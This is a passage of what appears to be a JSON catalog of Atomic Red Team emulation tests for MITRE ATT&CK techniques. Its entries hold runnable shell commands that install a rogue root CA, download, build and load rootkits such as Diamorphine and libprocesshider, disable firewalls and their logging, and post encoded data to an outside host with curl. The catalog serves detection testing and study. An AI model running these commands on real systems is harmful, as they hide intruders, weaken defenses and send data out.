      "command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\ncp #{cert_filename} /usr/local/share/certs/\ncertctl rehash\n",
      "cleanup_command": "rm /usr/local/share/certs/#{cert_filename}\ncertctl rehash\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "cert_filename": {
        "description": "Path of the CA certificate we create",
        "type": "path",
        "default": "rootCA.crt"
      },
      "key_filename": {
        "description": "Key we create that is used to create the CA certificate",
        "type": "path",
        "default": "rootCA.key"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Creates a root CA with openssl\n",
    "indexed_technique": "T1553.004.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1553.004",
    "display_name": "Subvert Trust Controls: Install Root Certificate",
    "source_file": "T1553.004.yaml",
    "test_name": "Install root CA on Debian/Ubuntu",
    "test_guid": "53bcf8a0-1549-4b85-b919-010c56d724ff",
    "description": "Creates a root CA with openssl\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "mv #{cert_filename} /usr/local/share/ca-certificates\nsudo update-ca-certificates\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "cert_filename": {
        "description": "CA file name",
        "type": "path",
        "default": "rootCA.crt"
      },
      "key_filename": {
        "description": "Key we create that is used to create the CA certificate",
        "type": "path",
        "default": "rootCA.key"
      }
    },
    "dependencies": [
      {
        "description": "Verify the certificate exists. It generates if not on disk.\n",
        "prereq_command": "if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out #{cert_filename}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Creates a root CA with openssl\n",
    "indexed_technique": "T1553.004.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1014",
    "display_name": "Rootkit",
    "source_file": "T1014.yaml",
    "test_name": "Loadable Kernel Module based Rootkit",
    "test_guid": "dfb50072-e45a-4c75-a17e-a484809c8553",
    "description": "Inserts the kernel module `T1014.ko` from the `PathToAtomicsFolder/T1014/bin` directory into the Linux kernel using `insmod`.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n",
      "cleanup_command": "sudo rmmod #{rootkit_name}\nsudo rm -rf #{rootkit_path}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "rootkit_source_path": {
        "description": "Path to the rootkit source. Used when prerequisites are fetched.",
        "type": "path",
        "default": "PathToAtomicsFolder/T1014/src/Linux"
      },
      "rootkit_path": {
        "description": "Path To rootkit",
        "type": "string",
        "default": "PathToAtomicsFolder/T1014/bin"
      },
      "rootkit_name": {
        "description": "Module name",
        "type": "string",
        "default": "T1014"
      }
    },
    "dependencies": [
      {
        "description": "The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n",
        "prereq_command": "if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp #{rootkit_source_path}/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir #{rootkit_path}\nmv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko\nrm -rf /tmp/T1014\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Loadable Kernel Module based Rootkit\n",
    "indexed_technique": "T1014.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1014",
    "display_name": "Rootkit",
    "source_file": "T1014.yaml",
    "test_name": "Loadable Kernel Module based Rootkit",
    "test_guid": "75483ef8-f10f-444a-bf02-62eb0e48db6f",
    "description": "Loads the kernel module T1014.ko using modprobe, then pings localhost 10 times to ensure it's hidden.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo modprobe #{rootkit_name}\n",
      "cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "rootkit_source_path": {
        "description": "Path to the rootkit source. Used when prerequisites are fetched.",
        "type": "path",
        "default": "PathToAtomicsFolder/T1014/src/Linux"
      },
      "rootkit_name": {
        "description": "Module name",
        "type": "string",
        "default": "T1014"
      }
    },
    "dependencies": [
      {
        "description": "The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)\n",
        "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp #{rootkit_source_path}/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Loadable Kernel Module based Rootkit\n",
    "indexed_technique": "T1014.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1014",
    "display_name": "Rootkit",
    "source_file": "T1014.yaml",
    "test_name": "dynamic-linker based rootkit (libprocesshider)",
    "test_guid": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3",
    "description": "Adds `/usr/local/lib/libprocesshider.so` to `/etc/ld.so.preload` to prevent the `evil_script.py` process from being listed by tools like `pgrep`.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n",
      "cleanup_command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "repo": {
        "description": "Url of the github repo zip",
        "type": "string",
        "default": "https://github.com/gianlucaborello/libprocesshider/"
      },
      "rev": {
        "description": "Revision of the github repo zip",
        "type": "string",
        "default": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"
      },
      "library_path": {
        "description": "Full path of the library to add to ld.so.preload",
        "type": "string",
        "default": "/usr/local/lib/libprocesshider.so"
      }
    },
    "dependencies": [
      {
        "description": "The preload library must exist on disk at specified location (#{library_path})\n",
        "prereq_command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
    "indexed_technique": "T1014.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1014",
    "display_name": "Rootkit",
    "source_file": "T1014.yaml",
    "test_name": "Loadable Kernel Module based Rootkit (Diamorphine)",
    "test_guid": "0b996469-48c6-46e2-8155-a17f8b6c2247",
    "description": "Loads Diamorphine kernel module, which hides itself and a processes.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
      "cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "repo": {
        "description": "Url of the diamorphine github repo",
        "type": "string",
        "default": "https://github.com/m0nad/Diamorphine/"
      },
      "rev": {
        "description": "Revision of the github repo zip",
        "type": "string",
        "default": "898810523aa2033f582a4a5903ffe453334044f9"
      },
      "rootkit_name": {
        "description": "Module name",
        "type": "string",
        "default": "diamorphine"
      }
    },
    "dependencies": [
      {
        "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
        "prereq_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "mkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
    "indexed_technique": "T1014.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chmod - Change file or folder mode (numeric mode)",
    "test_guid": "34ca1464-de9d-40c6-8c77-690adf36a135",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) permissions using chmod and a specified numeric mode (755).\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "chmod #{numeric_mode} #{file_or_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "numeric_mode": {
        "description": "Specified numeric mode value",
        "type": "integer",
        "default": 755
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
    "indexed_technique": "T1222.002.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chmod - Change file or folder mode (symbolic mode)",
    "test_guid": "fc9d6695-d022-4a80-91b1-381f5c35aff3",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) permissions using chmod and a specified symbolic mode (a+w).\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "chmod #{symbolic_mode} #{file_or_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "symbolic_mode": {
        "description": "Specified symbolic mode value",
        "type": "string",
        "default": "a+w"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
    "indexed_technique": "T1222.002.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chmod - Change file or folder mode (numeric mode) recursively",
    "test_guid": "ea79f937-4a4d-4348-ace6-9916aec453a4",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) permissions recursively using chmod and a specified numeric mode (755).\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "chmod -R #{numeric_mode} #{file_or_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "numeric_mode": {
        "description": "Specified numeric mode value",
        "type": "integer",
        "default": 755
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
    "indexed_technique": "T1222.002.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chmod - Change file or folder mode (symbolic mode) recursively",
    "test_guid": "0451125c-b5f6-488f-993b-5a32b09f7d8f",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) permissions recursively using chmod and a specified symbolic mode (a+w).\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "chmod -R #{symbolic_mode} #{file_or_folder}\n",
      "name": "bash"
    },
    "input_arguments": {
      "symbolic_mode": {
        "description": "Specified symbolic mode value",
        "type": "string",
        "default": "a+w"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
    "indexed_technique": "T1222.002.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chown - Change file or folder ownership and group",
    "test_guid": "d169e71b-85f9-44ec-8343-27093ff3dfc0",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml) ownership and group information to root:root using chown.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "chown #{owner}:#{group} #{file_or_folder}\n",
      "name": "bash"
    },
    "input_arguments": {
      "owner": {
        "description": "Username of desired owner",
        "type": "string",
        "default": "root"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
      },
      "group": {
        "description": "Group name of desired group",
        "type": "string",
        "default": "root"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's ownership and group information using chown.\n",
    "indexed_technique": "T1222.002.05",
    "technique_index": 5,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chown - Change file or folder ownership and group recursively",
    "test_guid": "b78598be-ff39-448f-a463-adbf2a5b7848",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) ownership and group information recursively to root:root using chown.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "chown -R #{owner}:#{group} #{file_or_folder}\n",
      "name": "bash"
    },
    "input_arguments": {
      "owner": {
        "description": "Username of desired owner",
        "type": "string",
        "default": "root"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      },
      "group": {
        "description": "Group name of desired group",
        "type": "string",
        "default": "root"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's ownership and group information recursively using chown.\n",
    "indexed_technique": "T1222.002.06",
    "technique_index": 6,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chown - Change file or folder mode ownership only",
    "test_guid": "967ba79d-f184-4e0e-8d09-6362b3162e99",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml) ownership only using chown.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "chown #{owner} #{file_or_folder}\n",
      "name": "sh"
    },
    "input_arguments": {
      "owner": {
        "description": "Username of desired owner",
        "type": "string",
        "default": "root"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's ownership only using chown.\n",
    "indexed_technique": "T1222.002.07",
    "technique_index": 7,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chown - Change file or folder ownership recursively",
    "test_guid": "3b015515-b3d8-44e9-b8cd-6fa84faf30b2",
    "description": "Changes the file's (/tmp/AtomicRedTeam/atomics/T1222.002) ownership only recursively using chown.\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "chown -R #{owner} #{file_or_folder}\n",
      "name": "bash"
    },
    "input_arguments": {
      "owner": {
        "description": "Username of desired owner",
        "type": "string",
        "default": "root"
      },
      "file_or_folder": {
        "description": "Path of the file or folder",
        "type": "path",
        "default": "/tmp/AtomicRedTeam/atomics/T1222.002"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Changes a file or folder's ownership only recursively using chown.\n",
    "indexed_technique": "T1222.002.08",
    "technique_index": 8,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chattr - Remove immutable file attribute",
    "test_guid": "e7469fe2-ad41-4382-8965-99b94dd3c13f",
    "description": "Remove the immutable attribute from /var/spool/cron/root using chattr.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "chattr -i #{file_to_modify}\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_to_modify": {
        "description": "Path of the file",
        "type": "path",
        "default": "/var/spool/cron/root"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
    "indexed_technique": "T1222.002.09",
    "technique_index": 9,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "chflags - Remove immutable file attribute",
    "test_guid": "60eee3ea-2ebd-453b-a666-c52ce08d2709",
    "description": "Remove the immutable attribute from /var/spool/cron/root using chflags.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "touch #{file_to_modify}\nchflags simmutable #{file_to_modify}\nchflags nosimmutable #{file_to_modify}\n",
      "name": "sh"
    },
    "input_arguments": {
      "file_to_modify": {
        "description": "Path of the file",
        "type": "path",
        "default": "/tmp/T1222.002.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Remove's a file's `immutable` attribute using `chflags`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
    "indexed_technique": "T1222.002.10",
    "technique_index": 10,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "Chmod through c script",
    "test_guid": "973631cf-6680-4ffa-a053-045e1b6b67ab",
    "description": "chmods the file (T1222002) using a c script (/tmp/T1222.002/src/T1222.002.c)\n",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "#{compiled_file} /tmp/ T1222002\n",
      "name": "sh"
    },
    "input_arguments": {
      "source_file": {
        "description": "Path of c source file",
        "type": "path",
        "default": "PathToAtomicsFolder/T1222.002/src/T1222.002.c"
      },
      "compiled_file": {
        "description": "Path of compiled file",
        "type": "path",
        "default": "/tmp/T1222002"
      }
    },
    "dependencies": [
      {
        "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
        "prereq_command": "gcc #{source_file} -o #{compiled_file}\n",
        "get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "chmods a file using a c script\n",
    "indexed_technique": "T1222.002.11",
    "technique_index": 11,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1222.002",
    "display_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
    "source_file": "T1222.002.yaml",
    "test_name": "Chown through c script",
    "test_guid": "18592ba1-5f88-4e3c-abc8-ab1c6042e389",
    "description": "Executes the compiled program `/tmp/T1222002own` with `sudo` to change the ownership of the `PathToAtomicsFolder/T1222.002/src/chown.c` file to root.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "sudo #{compiled_file} #{source_file}\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {
      "source_file": {
        "description": "Path of c source file",
        "type": "path",
        "default": "PathToAtomicsFolder/T1222.002/src/chown.c"
      },
      "compiled_file": {
        "description": "Path of compiled file",
        "type": "path",
        "default": "/tmp/T1222002own"
      }
    },
    "dependencies": [
      {
        "description": "Compile the script from (#{source_file}). Destination is #{compiled_file}\n",
        "prereq_command": "gcc #{source_file} -o #{compiled_file}\n",
        "get_prereq_command": "gcc #{source_file} -o #{compiled_file}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "chowns a file to root using a c script\n",
    "indexed_technique": "T1222.002.12",
    "technique_index": 12,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1057",
    "display_name": "Process Discovery",
    "source_file": "T1057.yaml",
    "test_name": "Process Discovery - ps",
    "test_guid": "4ff64f0b-aaf2-4866-b39d-38d9791407cc",
    "description": "Utilize ps and ps aux to list processes, saving the output to /tmp/loot.txt.",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "ps >> #{output_file}\nps aux >> #{output_file}\n",
      "cleanup_command": "rm #{output_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "output_file": {
        "description": "path of output file",
        "type": "path",
        "default": "/tmp/loot.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
    "indexed_technique": "T1057.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1132.001",
    "display_name": "Data Encoding: Standard Encoding",
    "source_file": "T1132.001.yaml",
    "test_name": "Base64 Encoded data.",
    "test_guid": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
    "description": "Encodes the string 111-11-1111 in base64 and posts it to MTExLTExLTExMTE=.redcanary.com using curl.",
    "supported_platforms": [
      "macos",
      "linux"
    ],
    "executor": {
      "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n",
      "name": "sh"
    },
    "input_arguments": {
      "destination_url": {
        "description": "Destination URL to post encoded data.",
        "type": "url",
        "default": "redcanary.com"
      },
      "base64_data": {
        "description": "Encoded data to post using fake Social Security number 111-11-1111.",
        "type": "string",
        "default": "MTExLTExLTExMTE="
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Utilizing a common technique for posting base64 encoded data.\n",
    "indexed_technique": "T1132.001.01",
    "technique_index": 1,
    "categories": [
      "command-and-control"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Stop/Start UFW firewall",
    "test_guid": "fe135572-edcd-49a2-afe6-1d39521c5a9a",
    "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "ufw disable\n",
      "cleanup_command": "ufw enable\nufw status verbose\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ufw is installed on the machine.\n",
        "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Stop the Uncomplicated Firewall (UFW) if installed.\n",
    "indexed_technique": "T1562.004.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Stop/Start Packet Filter",
    "test_guid": "0ca82ed1-0a94-4774-9a9a-a2c83a8022b7",
    "description": "Stop the Packet Filter if installed.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "service pf stop\nservice pf disable\n",
      "cleanup_command": "service pf enable\nservice pf start\nservice pf status\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if pfctl is installed on the machine.\n",
        "prereq_command": "if [ ! -x \"$(command -v pfctl)\" ]; then echo -e \"\\n***** PF NOT installed *****\\n\"; exit 1; fi\nif [ \"$(kldstat -n pf)\" = \"\" ]; then echo -e \"\\n***** PF inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Stop the Packet Filter if installed.\n",
    "indexed_technique": "T1562.004.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Stop/Start UFW firewall systemctl",
    "test_guid": "9fd99609-1854-4f3c-b47b-97d9a5972bd1",
    "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "systemctl stop ufw\n",
      "cleanup_command": "systemctl start ufw\nsystemctl status ufw\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if systemctl and ufw is installed on the machine.\n",
        "prereq_command": "if [ ! -x \"$(command -v systemctl)\" ]; then echo -e \"\\n***** systemctl NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n",
    "indexed_technique": "T1562.004.03",
    "technique_index": 3,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Turn off UFW logging",
    "test_guid": "8a95b832-2c2a-494d-9cb0-dc9dd97c8bad",
    "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "ufw logging off\n",
      "cleanup_command": "ufw logging low\nufw status verbose\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ufw is installed on the machine and enabled.\n",
        "prereq_command": "if [ ! -x \"$(command -v ufw)\" ]; then echo -e \"\\n***** ufw NOT installed *****\\n\"; exit 1; fi\nif echo \"$(ufw status)\" |grep -q \"inactive\"; then echo -e \"\\n***** ufw inactive *****\\n\"; exit 1; fi \n",
        "get_prereq_command": "echo \"\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
    "indexed_technique": "T1562.004.04",
    "technique_index": 4,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1562.004",
    "display_name": "Impair Defenses: Disable or Modify System Firewall",
    "source_file": "T1562.004.yaml",
    "test_name": "Add and delete UFW firewall rules",
    "test_guid": "b2563a4e-c4b8-429c-8d47-d5bcb227ba7a",
    "description": "Uses the `ufw` command to add a new rule to deny traffic from the IP address `1.2.3.4` and then displays the numbered rule list.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "ufw prepend deny from 1.2.3.4\nufw status numbered\n",
      "cleanup_command": "{ echo y; echo response; } | ufw delete 1\nufw status numbered\n"
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Check if ufw is installed on the machine and enabled.\n",
